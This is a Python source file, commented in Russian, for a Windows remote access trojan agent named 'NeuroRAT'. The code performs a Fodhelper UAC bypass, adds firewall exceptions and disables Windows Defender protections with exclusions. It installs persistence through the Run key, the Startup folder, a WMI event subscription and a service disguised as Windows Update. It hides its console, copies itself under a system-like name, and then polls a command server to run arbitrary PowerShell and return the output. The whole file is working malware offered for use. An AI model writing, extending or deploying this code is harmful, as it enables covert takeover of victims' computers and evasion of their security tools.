#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
NeuroRAT Windows Mini-Loader
Маленький модуль для выполнения команд сервера NeuroRAT на Windows системах
с обходом брандмауэра и повышением привилегий
"""

import os
import sys
import time
import ctypes
import socket
import random
import base64
import subprocess
import threading
import winreg
import platform
import tempfile
import shutil
import uuid
import logging
from datetime import datetime
from urllib.request import urlopen
import ssl
import json

# Настройка логгера
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    filename=os.path.join(tempfile.gettempdir(), 'windowsupdate.log'),
    filemode='a'
)
logger = logging.getLogger('win_agent_loader')

# Глобальные параметры
SERVER_ADDRESS = "http://localhost:8080"  # Заменить на реальный адрес сервера
SERVER_API = "/api/agent/{agent_id}/commands"
CHECK_INTERVAL = 60  # Интервал проверки команд (секунды)
AGENT_ID = None  # Будет сгенерирован автоматически

# Маскировка процесса
PROCESS_NAME = "svchost.exe"  # Для маскировки процесса

class WindowsAgent:
    def __init__(self):
        """Инициализация агента"""
        self.agent_id = str(uuid.uuid4())[:8]
        self.server_address = SERVER_ADDRESS
        self.is_admin = self._is_admin()
        self.system_info = self._get_system_info()
        self.persistence_methods = {
            "registry": self._add_to_registry,
            "startup": self._add_to_startup,
            "wmi": self._add_to_wmi,
            "service": self._create_service
        }
        
        # Отключаем проверки SSL для упрощения подключения
        ssl._create_default_https_context = ssl._create_unverified_context
        
        # Состояние агента
        self.running = True
        self.elevation_attempted = False

    def _is_admin(self):
        """Проверка, запущен ли скрипт с правами администратора"""
        try:
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except:
            return False
    
    def _get_system_info(self):
        """Сбор информации о системе"""
        info = {
            "hostname": socket.gethostname(),
            "username": os.getenv("USERNAME"),
            "os": platform.system() + " " + platform.release(),
            "arch": platform.architecture()[0],
            "processor": platform.processor(),
            "ip_address": socket.gethostbyname(socket.gethostname()),
            "admin": self.is_admin
        }
        return info
    
    def _bypass_uac(self):
        """Метод обхода UAC для получения прав администратора"""
        if self.is_admin or self.elevation_attempted:
            return self.is_admin
        
        self.elevation_attempted = True
        
        # Метод 1: Fodhelper UAC Bypass
        try:
            # Создаем путь до вредоносного COM-объекта
            cmd_path = os.path.abspath(sys.executable)
            registry_path = r"Software\Classes\ms-settings\shell\open\command"
            
            # Создаем ключи реестра
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, registry_path)
            winreg.SetValueEx(key, None, 0, winreg.REG_SZ, cmd_path + f" \"{__file__}\"")
            winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
            winreg.CloseKey(key)
            
            # Запускаем fodhelper.exe для триггера UAC bypass
            subprocess.Popen("fodhelper.exe")
            
            # Ждем запуска с повышенными правами и удаляем ключи
            time.sleep(2)
            registry_path = r"Software\Classes\ms-settings"
            subprocess.call(f'reg delete "HKCU\\{registry_path}" /f', shell=True)
            
            logger.info("UAC Bypass через Fodhelper выполнен")
            return True
        except Exception as e:
            logger.error(f"Ошибка при обходе UAC: {str(e)}")
            
            # Метод 2: Запрос прав администратора через ShellExecute
            try:
                ctypes.windll.shell32.ShellExecuteW(
                    None, "runas", sys.executable, f"\"{__file__}\"", None, 1
                )
                logger.info("Запрошены права администратора через ShellExecute")
                # Текущий процесс завершается, новый будет с правами админа
                sys.exit(0)
            except Exception as e2:
                logger.error(f"Ошибка при запросе прав админа: {str(e2)}")
                
            return False
    
    def _bypass_firewall(self):
        """Обход брандмауэра Windows"""
        if not self.is_admin:
            logger.warning("Требуются права администратора для обхода брандмауэра")
            return False
        
        try:
            # Создаем правило для исключения в брандмауэре
            process_name = os.path.basename(sys.executable)
            rule_name = "Windows System Update Service"
            
            # Добавляем правило в брандмауэр через netsh
            subprocess.call(
                f'netsh advfirewall firewall add rule name="{rule_name}" dir=in action=allow program="{sys.executable}" enable=yes profile=any',
                shell=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            # Также делаем исключение для исходящих соединений
            subprocess.call(
                f'netsh advfirewall firewall add rule name="{rule_name}" dir=out action=allow program="{sys.executable}" enable=yes profile=any',
                shell=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            logger.info("Правила брандмауэра успешно добавлены")
            return True
        except Exception as e:
            logger.error(f"Ошибка при обходе брандмауэра: {str(e)}")
            return False
    
    def _add_to_registry(self):
        """Добавление в автозагрузку через реестр"""
        try:
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE)
            winreg.SetValueEx(key, "WindowsSystemUpdate", 0, winreg.REG_SZ, f'"{sys.executable}" "{__file__}"')
            winreg.CloseKey(key)
            logger.info("Агент добавлен в автозагрузку через реестр")
            return True
        except Exception as e:
            logger.error(f"Ошибка при добавлении в реестр: {str(e)}")
            return False
    
    def _add_to_startup(self):
        """Добавление в папку автозагрузки"""
        try:
            startup_folder = os.path.join(
                os.getenv("APPDATA"),
                r"Microsoft\Windows\Start Menu\Programs\Startup"
            )
            
            # Создаем .bat файл в папке автозагрузки
            batch_path = os.path.join(startup_folder, "WindowsSystemUpdate.bat")
            with open(batch_path, "w") as f:
                f.write(f'@echo off\nstart "" "{sys.executable}" "{__file__}"\n')
            
            logger.info("Агент добавлен в папку автозагрузки")
            return True
        except Exception as e:
            logger.error(f"Ошибка при добавлении в автозагрузку: {str(e)}")
            return False
    
    def _add_to_wmi(self):
        """Установка постоянства через WMI (требуются права администратора)"""
        if not self.is_admin:
            logger.warning("Требуются права администратора для WMI")
            return False
        
        try:
            # Создаем WMI триггер
            wmi_script = f'''
            strComputer = "."
            Set objWMIService = GetObject("winmgmts:\\\\" & strComputer & "\\root\\subscription")
            
            ' Создаем экземпляр триггера
            Set objEventFilter = objWMIService.ExecQuery("SELECT * FROM __EventFilter WHERE Name='WinSystemUpdateFilter'")
            If objEventFilter.Count = 0 Then
                Set objNewEventFilter = objWMIService.Get("__EventFilter").SpawnInstance_()
                objNewEventFilter.Name = "WinSystemUpdateFilter"
                objNewEventFilter.EventNamespace = "root\\cimv2"
                objNewEventFilter.QueryLanguage = "WQL"
                objNewEventFilter.Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 120"
                objNewEventFilter.Put_
            End If
            
            ' Создаем экземпляр действия
            Set objEventConsumer = objWMIService.ExecQuery("SELECT * FROM CommandLineEventConsumer WHERE Name='WinSystemUpdateConsumer'")
            If objEventConsumer.Count = 0 Then
                Set objNewEventConsumer = objWMIService.Get("CommandLineEventConsumer").SpawnInstance_()
                objNewEventConsumer.Name = "WinSystemUpdateConsumer"
                objNewEventConsumer.ExecutablePath = "{sys.executable}"
                objNewEventConsumer.CommandLineTemplate = "{__file__}"
                objNewEventConsumer.Put_
            End If
            
            ' Связываем триггер и действие
            Set objBinding = objWMIService.ExecQuery("SELECT * FROM __FilterToConsumerBinding WHERE Filter='__EventFilter.Name=""WinSystemUpdateFilter""' AND Consumer='CommandLineEventConsumer.Name=""WinSystemUpdateConsumer""'")
            If objBinding.Count = 0 Then
                Set objNewBinding = objWMIService.Get("__FilterToConsumerBinding").SpawnInstance_()
                objNewBinding.Filter = "__EventFilter.Name=""WinSystemUpdateFilter"""
                objNewBinding.Consumer = "CommandLineEventConsumer.Name=""WinSystemUpdateConsumer"""
                objNewBinding.Put_
            End If
            '''
            
            # Сохраняем скрипт во временный файл и выполняем
            vbs_path = os.path.join(tempfile.gettempdir(), "wmi_install.vbs")
            with open(vbs_path, "w") as f:
                f.write(wmi_script)
            
            subprocess.call(f'cscript //nologo "{vbs_path}"', shell=True)
            os.remove(vbs_path)  # Удаляем временный файл
            
            logger.info("WMI персистентность установлена")
            return True
        except Exception as e:
            logger.error(f"Ошибка при установке WMI персистентности: {str(e)}")
            return False
    
    def _create_service(self):
        """Создание Windows службы для запуска агента"""
        if not self.is_admin:
            logger.warning("Требуются права администратора для создания службы")
            return False
        
        try:
            # Копируем файл в системную директорию
            system32_dir = os.path.join(os.environ['WINDIR'], 'System32')
            service_exe = os.path.join(system32_dir, "WindowsUpdateSvc.exe")
            
            # Создаем .exe файл с помощью PyInstaller в будущем
            # Сейчас просто создадим bat файл
            service_bat = os.path.join(system32_dir, "WindowsUpdateSvc.bat")
            with open(service_bat, 'w') as f:
                f.write(f'@echo off\n"{sys.executable}" "{__file__}"\n')
            
            # Создаем службу
            subprocess.call(
                f'sc create WindowsUpdateSvc binPath= "cmd /c {service_bat}" start= auto DisplayName= "Windows Update Service"',
                shell=True
            )
            subprocess.call('sc start WindowsUpdateSvc', shell=True)
            
            logger.info("Служба Windows создана и запущена")
            return True
        except Exception as e:
            logger.error(f"Ошибка при создании службы: {str(e)}")
            return False
    
    def establish_persistence(self):
        """Установка различных методов персистентности"""
        # Пробуем разные методы в порядке надежности
        methods = ["registry", "startup"]
        
        # Если есть права администратора, добавляем методы, требующие их
        if self.is_admin:
            methods.extend(["wmi", "service"])
        
        # Пробуем каждый метод
        for method in methods:
            if self.persistence_methods[method]():
                logger.info(f"Персистентность установлена через: {method}")
                return True
        
        logger.warning("Не удалось установить персистентность")
        return False
    
    def _disable_defender(self):
        """Попытка отключения Windows Defender"""
        if not self.is_admin:
            logger.warning("Требуются права администратора для отключения Defender")
            return False
        
        try:
            # Отключаем Real-time Protection
            subprocess.call(
                "powershell -Command Set-MpPreference -DisableRealtimeMonitoring $true",
                shell=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            # Отключаем другие компоненты
            defender_settings = {
                "DisableIOAVProtection": "$true",
                "DisableBehaviorMonitoring": "$true",
                "DisableBlockAtFirstSeen": "$true",
                "DisableEmailScanning": "$true",
                "DisableScanningNetworkFiles": "$true",
                "DisableScriptScanning": "$true"
            }
            
            for setting, value in defender_settings.items():
                subprocess.call(
                    f"powershell -Command Set-MpPreference -{setting} {value}",
                    shell=True,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
            
            # Добавляем исключения
            exe_path = sys.executable
            current_path = os.path.abspath(__file__)
            
            subprocess.call(
                f'powershell -Command Add-MpPreference -ExclusionPath "{exe_path}"',
                shell=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            subprocess.call(
                f'powershell -Command Add-MpPreference -ExclusionPath "{current_path}"',
                shell=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            subprocess.call(
                f'powershell -Command Add-MpPreference -ExclusionPath "{os.environ["TEMP"]}"',
                shell=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            logger.info("Windows Defender успешно отключен/настроен")
            return True
        except Exception as e:
            logger.error(f"Ошибка при отключении Windows Defender: {str(e)}")
            return False
    
    def execute_command(self, command):
        """Выполнение команды и возвращение результата"""
        try:
            # Выполняем команду через PowerShell для большей гибкости
            if command.startswith("powershell"):
                # Уже команда PowerShell
                process = subprocess.Popen(
                    command,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    shell=True,
                    text=True
                )
            else:
                # Оборачиваем в PowerShell для лучшей совместимости
                process = subprocess.Popen(
                    f'powershell -ExecutionPolicy Bypass -Command "{command}"',
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    shell=True,
                    text=True
                )
            
            stdout, stderr = process.communicate(timeout=60)
            return {
                "status": "success" if process.returncode == 0 else "error",
                "exit_code": process.returncode,
                "stdout": stdout,
                "stderr": stderr
            }
        except subprocess.TimeoutExpired:
            process.kill()
            return {
                "status": "timeout",
                "message": "Command execution timed out after 60 seconds"
            }
        except Exception as e:
            return {
                "status": "error",
                "message": str(e)
            }
    
    def register_with_server(self):
        """Регистрация агента на сервере"""
        try:
            # Подготавливаем данные для регистрации
            data = {
                "agent_id": self.agent_id,
                "system_info": self.system_info,
                "registration_time": datetime.now().isoformat()
            }
            
            # Отправляем запрос на сервер
            url = f"{self.server_address}/api/register"
            json_data = json.dumps(data).encode('utf-8')
            
            request = urlopen(
                url,
                data=json_data,
                timeout=10
            )
            
            response = json.loads(request.read().decode('utf-8'))
            
            if response.get("status") == "success":
                logger.info(f"Агент успешно зарегистрирован, ID: {self.agent_id}")
                return True
            else:
                logger.error(f"Ошибка регистрации: {response.get('message', 'Unknown error')}")
                return False
        except Exception as e:
            logger.error(f"Исключение при регистрации агента: {str(e)}")
            return False
    
    def get_commands(self):
        """Получение команд от сервера"""
        try:
            url = f"{self.server_address}/api/agent/{self.agent_id}/commands"
            request = urlopen(url, timeout=10)
            response = json.loads(request.read().decode('utf-8'))
            
            if response.get("status") == "success":
                return response.get("commands", [])
            else:
                logger.error(f"Ошибка получения команд: {response.get('message', 'Unknown error')}")
                return []
        except Exception as e:
            logger.error(f"Исключение при получении команд: {str(e)}")
            return []
    
    def send_command_result(self, command_id, result):
        """Отправка результатов выполнения команды"""
        try:
            url = f"{self.server_address}/api/agent/{self.agent_id}/results"
            data = {
                "command_id": command_id,
                "result": result,
                "timestamp": datetime.now().isoformat()
            }
            
            json_data = json.dumps(data).encode('utf-8')
            
            request = urlopen(
                url,
                data=json_data,
                timeout=10
            )
            
            response = json.loads(request.read().decode('utf-8'))
            
            if response.get("status") == "success":
                logger.info(f"Результат для команды {command_id} успешно отправлен")
                return True
            else:
                logger.error(f"Ошибка отправки результата: {response.get('message', 'Unknown error')}")
                return False
        except Exception as e:
            logger.error(f"Исключение при отправке результата: {str(e)}")
            return False
    
    def command_loop(self):
        """Основной цикл получения и выполнения команд"""
        while self.running:
            try:
                # Получаем команды от сервера
                commands = self.get_commands()
                
                for command in commands:
                    command_id = command.get("id")
                    command_text = command.get("command")
                    
                    logger.info(f"Получена команда {command_id}: {command_text}")
                    
                    # Выполняем команду
                    result = self.execute_command(command_text)
                    
                    # Отправляем результат
                    self.send_command_result(command_id, result)
                
                # Задержка между проверками
                time.sleep(CHECK_INTERVAL)
            except Exception as e:
                logger.error(f"Ошибка в цикле команд: {str(e)}")
                time.sleep(CHECK_INTERVAL)
    
    def start(self):
        """Запуск агента"""
        logger.info("Запуск Windows агента NeuroRAT")
        
        # Обход защиты и повышение прав
        if not self.is_admin:
            logger.info("Попытка повышения привилегий...")
            self._bypass_uac()
        
        # Если получили права админа, устанавливаем защиту
        if self.is_admin:
            logger.info("Агент запущен с правами администратора")
            self._bypass_firewall()
            self._disable_defender()
        else:
            logger.info("Агент запущен без прав администратора")
        
        # Устанавливаем постоянство
        self.establish_persistence()
        
        # Регистрируемся на сервере
        if not self.register_with_server():
            logger.warning("Не удалось зарегистрироваться, продолжаем без регистрации")
        
        # Запускаем цикл команд
        command_thread = threading.Thread(target=self.command_loop)
        command_thread.daemon = True
        command_thread.start()
        
        # Основной цикл для поддержания работы
        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            self.running = False
            logger.info("Агент остановлен пользователем")
        except Exception as e:
            logger.error(f"Критическая ошибка: {str(e)}")
        
        logger.info("Агент завершает работу")

def hide_console_window():
    """Скрывает окно консоли"""
    try:
        kernel32 = ctypes.WinDLL('kernel32')
        user32 = ctypes.WinDLL('user32')
        
        hwnd = kernel32.GetConsoleWindow()
        
        if hwnd:
            user32.ShowWindow(hwnd, 0)  # SW_HIDE = 0
        return True
    except Exception as e:
        print(f"Error hiding console: {str(e)}")
        return False

def copy_to_safe_location():
    """Копирует агент в безопасное место и запускает его оттуда"""
    try:
        # Определяем целевую директорию
        target_dir = os.path.join(
            os.getenv("LOCALAPPDATA"),
            "Microsoft",
            "WindowsApps"
        )
        
        # Создаем директорию, если не существует
        if not os.path.exists(target_dir):
            os.makedirs(target_dir)
        
        # Копируем файл
        current_file = os.path.abspath(__file__)
        target_file = os.path.join(target_dir, "WindowsSystemHelper.py")
        
        # Если файл уже существует и запущен оттуда, продолжаем
        if os.path.abspath(__file__).lower() == target_file.lower():
            return True
        
        # Иначе копируем и перезапускаем
        shutil.copy2(current_file, target_file)
        
        # Запускаем из новой локации и завершаем текущий процесс
        subprocess.Popen([sys.executable, target_file])
        sys.exit(0)
    except Exception as e:
        print(f"Error copying to safe location: {str(e)}")
        return False

def masquerade_process():
    """Маскировка процесса Python под системный процесс"""
    try:
        # В будущем здесь будет код для изменения имени процесса
        # Для полной реализации требуется низкоуровневый доступ
        pass
    except Exception as e:
        logger.error(f"Ошибка при маскировке процесса: {str(e)}")

if __name__ == "__main__":
    # Применяем меры маскировки при необходимости
    if "--hidden" not in sys.argv:
        # При первом запуске выполняем скрытие и перемещение
        hide_console_window()
        copy_to_safe_location()
    
    # Маскируем процесс
    masquerade_process()
    
    # Запускаем агент
    agent = WindowsAgent()
    agent.start() 